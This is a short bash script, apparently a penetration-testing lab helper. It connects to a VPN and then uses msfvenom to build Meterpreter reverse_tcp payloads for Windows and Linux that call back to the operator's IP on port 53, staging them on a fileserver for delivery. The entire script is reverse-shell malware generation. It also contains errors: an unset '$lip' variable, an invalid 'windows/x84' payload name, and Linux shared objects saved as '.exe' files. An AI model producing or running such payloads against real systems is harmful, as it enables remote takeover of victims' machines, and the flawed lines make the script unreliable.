#!/bin/bash

nohup openvpn $HOME/hack/*.ovpn 1>&2 2>/dev/null &
sleep 10
sed -i -e "s/LIP/$lip/" $HOME/fileserver/lin/reverse_brute.sh
msfvenom -p windows/x64/meterpreter/reverse_tcp lport=53 lhost=$lip -f exe    > "$HOME/fileserver/win/mtptrx64_${lip}_p53.exe"
msfvenom -p windows/x84/meterpreter/reverse_tcp lport=53 lhost=$lip -f exe    > "$HOME/fileserver/win/mtptrx86_${lip}_p53.exe"
msfvenom -p linux/x64/meterpreter/reverse_tcp   lport=53 lhost=$lip -f elf-so > "$HOME/fileserver/lin/mtptrx64_${lip}_p53.exe"
msfvenom -p linux/x86/meterpreter/reverse_tcp   lport=53 lhost=$lip -f elf-so > "$HOME/fileserver/lin/mtptrx86_${lip}_p53.exe"
